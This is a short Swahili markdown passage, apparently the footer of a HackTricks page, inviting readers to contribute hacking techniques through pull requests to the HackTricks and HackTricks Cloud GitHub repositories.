+* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
